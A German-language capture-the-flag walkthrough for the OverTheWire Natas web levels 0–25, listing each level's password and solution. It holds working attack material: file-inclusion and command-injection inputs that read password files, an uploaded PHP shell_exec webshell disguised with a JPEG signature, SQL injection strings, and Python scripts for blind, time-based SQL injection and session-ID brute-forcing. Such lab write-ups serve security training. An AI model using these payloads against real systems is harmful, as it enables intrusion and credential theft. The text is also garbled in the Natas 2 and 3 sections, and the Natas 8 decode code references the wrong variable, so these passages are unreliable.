# Natas 0

Zugriff:	[http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org)
Username: `natas0`
Passwort: `natas0`

Das Passwort für Natas1 ist im Seitenquelltext als Kommentar hinterlegt.

# Natas 1
Zugriff:	[http://natas1.natas.labs.overthewire.org](http://natas1.natas.labs.overthewire.org)
Username: `natas1`
Passwort: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

Das Passwort für Natas2 lässt sich wie folgt auslesen: Mit `F12` den Debugger öffnen und im Haupt-Thread auf `index` navigieren. Dort ist das Passwort als Kommentar hinterlegt.

# Natas 2
Zugriff:	[http://natas2.natas.labs.overthewire.org](http://natas2.natas.labs.overthewire.org)
Username: `natas2`
Passwort: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

Im Quelltext der Seite befindet sich ein il een oe it `iesien neeben tSmi ist klrdas sich ter er dresse natas.natas.labs.overthewire.org/fies in aerzeichnis t.
Beim Aufrufen des Verzeichnisses finde i neen erxel.pnateiaheine tate mit de Naen user.tt. n dieer indet sich das asswUser.zxzort r eel 

# Natas 3
Zugriff:	[http://natas3.natas.labs.overthewire.org](http://natas.natas.labs.overthewire.org)
Username: `natas3`
Passwort: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

Im Quelltext der Seite befindet sich folgender inwis:o mre information les ot even oole wi fnd i this t.
Dies ist ein Hinweis auf die Robots.txt, welche das Verhalten der Roboter der Suchmaschinen beeinflusst. 
> https://wiki.selfhtml.org/wiki/Grundlagen/Robots.txt

Da sich die robots.txt immer im Root-Verzeichnis der Website befindet, können wir diese über http://natas3.natas.labs.overthewire.org/robots.txt aufrufen.
In dieser finden wir das Verzeichnis `/s3cr3t/`.
Beim Aufrufen des Verzeichnisses finden wir wie in Level 2 eine users.txt, welche das Passwort für das folgende Level enthällt.


# Natas 4
Zugriff:	[http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org)
Username: `natas4`
Passwort: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

Natas 4 begrüßt uns mit der Nachricht:
> Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Als Lösung kommen hier die HTTP-Header ins Spiel:
> https://de.wikipedia.org/wiki/Liste_der_HTTP-Headerfelder

Diese lassen sich zum Beispiel durch dass Add-on "Tamper" bearbeiten.
Nun kann der Http-Referer von "http://natas4.natas.labs.overthewire.org/" zu "http://natas5.natas.labs.overthewire.org/" geändert werden.

Beim Neuladen der Seite geben wir so nun vor, von der Natas5 Seite zu kommen, was die Lösung dieses Levels ist. 

# Natas 5
Zugriff:	[http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org)
Username: `natas5`
Passwort: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

Der Starttext von Natas5 lautet: 
> Access disallowed. You are not logged in

Im Cookieverzeichnis der Website findet sich ein Cookie mit dem Namen "loggedin". Wenn wir diesen auf "1" setzen und die Seite neuladen, erhalten wir das Passwort für Natas6.

# Natas 6
Zugriff:	[http://natas6.natas.labs.overthewire.org](http://natas6.natas.labs.overthewire.org)
Username: `natas6`
Passwort: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

Bei diesem Level erhalten wir einen Link zum Sourcecode der Seite:
```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
```
Die Lösung liegt hier in der Zeile `"includes/secret.inc";`
Beim Aufruf dieser Datei finden wir eine leere Datei vor, jedoch befindet sich das "secret"-Wort als Kommentar im Quelltext.

# Natas 7
Zugriff:	[http://natas7.natas.labs.overthewire.org](http://natas7.natas.labs.overthewire.org)
Username: `natas7`
Passwort: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

Beim Klicken auf die Links "Home" und "About" sieht man, dass an die URL die Parameter "?page=home" oder "?page=about" angehängt werden.
Im Quelltext findet man den Hinweis, dass sich das Passwort in einer Datei unter dem Pfad `/etc/natas_webpass/natas8` befindet.

>https://en.wikipedia.org/wiki/File_inclusion_vulnerability

Mit dem Wissen über die File-inclusion-vulnerability können wir nun versuchen uns das Passwort ausgeben zu lassen, in dem wir den Pfad als Parameter übergeben: `?page=/etc/natas_webpass/natas8`
Daraufhin gibt uns die Seite das Passwort für Natas8 aus.

# Natas 8
Zugriff:	[http://natas8.natas.labs.overthewire.org](http://natas8.natas.labs.overthewire.org)
Username: `natas8`
Passwort: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

Im Sourcecode sieht man folgenden Code:

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

Um auf die Variable `$secret` zu kommen, muss man die Funktionen umdrehen. 

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($encodedSecret) {
    return base64_decode(strrev(hex2bin($secret)));
}
```

# Natas 9

Zugriff:	[http://natas9.natas.labs.overthewire.org](http://natas9.natas.labs.overthewire.org)
Username: `natas9`
Passwort: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

Im Sourcecode sieht man folgenden Code:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Wir können mit dem input `$key` einen modifizierten bash Befehl ausführen.  Alle Passwörter sind im Ordner `/etc/natas_webpass` gespeichert. Über grep können wir auch in der Datei suchen.

Input: `[A-z] /etc/natas_webpass/natas11`

# Natas 10

Zugriff:	[http://natas10.natas.labs.overthewire.org](http://natas10.natas.labs.overthewire.org)
Username: `natas10`
Passwort: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

Einige Zeichen sind nicht erlaubt. Man muss nur den Input anpassen: `. /etc/natas_webpass/natas11`

# Natas 11

Zugriff:	[http://natas11.natas.labs.overthewire.org](http://natas11.natas.labs.overthewire.org)
Username: `natas11`
Passwort: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

Nachbau der XOR Funktion. 
out = in ⊕ key ist äquivalent zu key = out ⊕ in

```php
$in = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));

function xor_encrypt($in) {
    $key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D");
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt($in);
```

```php
>> qw8J
```

```php
$in = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));

function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt($in));
```

Cookie mit `showpassword=yes`: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

# Natas 12

Zugriff:	[http://natas12.natas.labs.overthewire.org](http://natas12.natas.labs.overthewire.org)
Username: `natas12`
Passwort: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

Der Upload ist nicht auf JPG's beschränkt. Im hidden input der Form, kann `value` verändert werde. Der Name der Datei ist random, aber nicht die Dateiendung. Man kann hier ein eigenes php Skript hochladen, das das Passwort ausgibt.

```php
<?
echo(shell_exec('cat /etc/natas_webpass/natas13'));
?>
```

# Natas 13

Zugriff:	[http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)
Username: `natas13`
Passwort: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY `

Die Funktion `exif_imagetype` überprüft die ersten Hex-stellen einer Datei, um zu verifizieren, dass die Datei ein Bild ist. Man kann die File Signature eines jpg's `FF D8 FF` vor eine php Datei mit einem Hex Editor einfügen, um den Check zu umgehen. 

```
FF D8 FF 3C 3F 0D 0A 65 63 68 6F 28 73 68 65 6C 6C 5F 65 78 65 63 28 27 63 61 74 20 2F 65 74 63 2F 6E 61 74 61 73 5F 77 65 62 70 61 73 73 2F 6E 61 74 61 73 31 34 27 29 29 3B 0D 0A
```

# Natas 14

Zugriff:	[http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org)
Username: `natas14`
Passwort: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1  `

Passwort über SQL Injection auslesbar. Input im Passwortfeld: `" or "1" = "1` 
Im Get kann debug aktiviert werden, z.B. über OWASP ZAP. 

# Natas 15

Zugriff:	[http://natas15.natas.labs.overthewire.org](http://natas15.natas.labs.overthewire.org)
Username: `natas15`
Passwort: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  `

User `natas16` existiert. Passwort über SQL-Injection mit Like:

```Python
import string
import requests

hasFound = False
list = string.ascii_letters + "0123456789"
found = ""
toTry = ""
passwordChars = []

print("Collecting Password Information ...")

for i in list:
    data = {'username': 'natas16" and password like BINARY "%' + i + '%'}
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php',
                      auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
                      data=data)

    if 'This user exists.' in r.text:
        passwordChars.append(i)


print("Password Contains: ", passwordChars)

print("Attacking Natas Server... ")

while not hasFound:
    for i in passwordChars:
        toTry = i

        data = {'username': 'natas16" and password like BINARY "' + found + toTry + '%'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php',
                          auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
                          data=data)

        if 'This user exists.' in r.text:
            found += i
            print("found: " + found)
            if len(found) >= 32:
                hasFound = True
                print("Password for Natas 16 is: "+found)
            break
```

# Natas 16

Zugriff:	[http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org)
Username: `natas16`
Passwort: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh  `

Der Server führt ein grep Befehl aus, allerdings mit `""` Klammern, die Befehle und Zugriff auf Variablen zulassen. Wir können über einen nested grep Befehl rausfinden, ob ein Character im Passwort vorkommt. Über ein Bruteforce Script, lässt sich das Passwort auslesen.

```python
import string
import requests

hasFound = False
list = string.ascii_letters + "0123456789"
found = ""
toTry = ""
passwordChars = []

print("Collecting Password Information ...")

for i in list:
    data = {'needle': 'afresh$(grep '+i+' /etc/natas_webpass/natas17)'}
    r = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
                      auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
                      data=data)

    if 'afresh' not in r.text:
        passwordChars.append(i)

print("Password contains: ", passwordChars)
print("Attacking Natas Server... ")

while not hasFound:

    for i in passwordChars:
        toTry = i
        data = {'needle': 'afresh$(grep ^' + found + toTry + ' /etc/natas_webpass/natas17)'}
        r = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
                          auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
                          data=data)

        if 'afresh' not in r.text:
            found += toTry
            print("found: "+found)
            if len(found) >= 32:
                hasFound = True
            break
```

# Natas 17

Zugriff:	[http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org)
Username: `natas17`
Passwort: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  `

Time based attack über SQL-Injection mit sleep(). Falls das Passwort vorhanden, sleep(1) ausführen und warten.

```Python
import string
import requests

hasFound = False
list = string.ascii_letters + "0123456789"
found = ""
toTry = ""
passwordChars = []

print("Collecting Password Information ...")

for i in list:
    data = {'username': 'natas18" and password like binary "%'+i+'%" and sleep(1) and "1" = "1'}
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',
                      auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),
                      data=data)
    if r.elapsed.total_seconds() >= 1:
        passwordChars.append(i)
        print("", passwordChars)


print("Password Contains: ", passwordChars)

print("Attacking Natas Server... ")

while not hasFound:
    for i in passwordChars:
        toTry = i
        print("Try: "+found +i)
        data = {'username': 'natas18" and password like binary "'+found+toTry+'%" and sleep(1) and "1" = "1'}
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',
                          auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),
                          data=data)

        if r.elapsed.total_seconds() >= 1:
            found += i
            print("found: " + found)
            if len(found) >= 32:
                hasFound = True
                print("Password for Natas 18 is: "+found)
            break
```

# Natas 18

Zugriff:	[http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org)
Username: `natas18`
Passwort: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP  `

Session Hijacking Attack. Die PHPSESSID wird über den Cookie gesetzt. Diesen kann man beim request mitgeben. 

```python
import requests

sessions = [x for x in range(1, 640)]
for i in sessions:
    print("Sniffing Session: " + str(i))
    cookies = {'PHPSESSID': str(i)}
    r = requests.post('http://natas18.natas.labs.overthewire.org/index.php',
                      auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
                      cookies=cookies)

    if 'You are an admin.' in r.text:
        print("Admin Session found. ID = "+str(i))
        print(r.text)
        break
```

# Natas 19

Zugriff:	[http://natas19.natas.labs.overthewire.org](http://natas19.natas.labs.overthewire.org)
Username: `natas19`
Passwort: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs  `

Die PHPSESSID ist zws. 1 und 640-admin als Hex-wert codiert.

```python
import requests

auth_user = "natas19"
auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = "http://natas19.natas.labs.overthewire.org/"
list = [x for x in range(59594)][::-1]

sessions = [x for x in range(1, 640)]
for i in sessions:
    sessid = str(i)+"-admin"
    hexvals = [format(ord(str(x)), "x") for x in sessid]
    cookie = "".join(hexvals)

    print("Sniffing Session: ID " +str(i)+ " "+ cookie)
    cookies = {'PHPSESSID': cookie}
    r = requests.post(url,
                      auth=(auth_user, auth_password),
                      cookies=cookies)

    if 'You are an admin.' in r.text:
        print("Admin Session found. ID = " + str(i))
        print(r.text)
        break
```

# Natas 20

Zugriff:	[http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
Username: `natas20`
Passwort: `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF  `

Explode kann ausgenutzt werden. `\n` wird dazu genutzt, `admin=1` zu erzeugen.

```python
import requests

auth_user = "natas20"
auth_password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
url = "http://natas20.natas.labs.overthewire.org/?debug"
data = {'name':'\nadmin 1'}
cookies = {'PHPSESSID': 'frtgeub0ptgojm5bvs2bovo7g6'}

r = requests.post(url, auth=(auth_user, auth_password), data=data, cookies=cookies)
r2 = requests.get(url, auth=(auth_user, auth_password), cookies=cookies)
print(r2.text)
```

# Natas 21

Zugriff:	[http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
Username: `natas21`
Passwort: `IFekPyrQXftziDEsUr3x21sYuahypdgJ  `

```python
import requests

auth_user = "natas21"
auth_password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url = "http://natas21-experimenter.natas.labs.overthewire.org/?debug&submit&admin=1"
url2 = "http://natas21.natas.labs.overthewire.org/?debug&submit&admin=1"
data = {'name':'\nadmin 1'}


r = requests.post(url, auth=(auth_user, auth_password))

for c in r.cookies:
    session = c.value

cookies = {'PHPSESSID': session}
r2 = requests.get(url2, auth=(auth_user, auth_password), cookies=cookies)

print(r2.text)
```

# Natas 22

Zugriff:	[http://natas22.natas.labs.overthewire.org](http://natas22.natas.labs.overthewire.org)
Username: `natas22`
Passwort: `chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ`

Beim Request  `?revelio` anhängen und mit OWASP ZAP Traffic abfangen. 

# Natas 23

Zugriff:	[http://natas23.natas.labs.overthewire.org](http://natas23.natas.labs.overthewire.org)
Username: `natas23`
Passwort: `D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE`

Durch die Abfrage, ob `$_REQUEST["passwd"]` größer 10 ist, wird der String in `$_REQUEST["passwd"]` zu einem Integer konvertiert. Da Buchstaben nicht konvertiert werden können, wird nur `0` zurückgegeben. Beginnt der übergebene String jedoch mit einer Zahl, wird diese Zahl zu einem Integer konvertiert und die Konvertierung wird erst danach abgebrochen. `11iloveyou` wird zu `11`. Somit wird der Vergleich `($_REQUEST["passwd"]>10)` wahr und das Passwort wird ausgegeben. 

# Natas 24

Zugriff:	[http://natas24.natas.labs.overthewire.org](http://natas24.natas.labs.overthewire.org)
Username: `natas24`
Passwort: `OsRmXFguozKpTZZ5X14zNO43379LZveg`

`strcmp` gibt 0 zurück, falls der Vergleich fehlschlägt.

```python
import requests

auth_user = "natas24"
auth_password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

url = "http://natas24.natas.labs.overthewire.org/"
data = {'passwd[]':'array(0=>"")'}

r = requests.post(url=url, auth=(auth_user, auth_password), data=data)
print(r.text)
```

# Natas 25

Zugriff:	[http://natas25.natas.labs.overthewire.org](http://natas25.natas.labs.overthewire.org)
Username: `natas25`
Passwort: `GHF6X7YwACaYYssHVY05cFq83hRktl4c`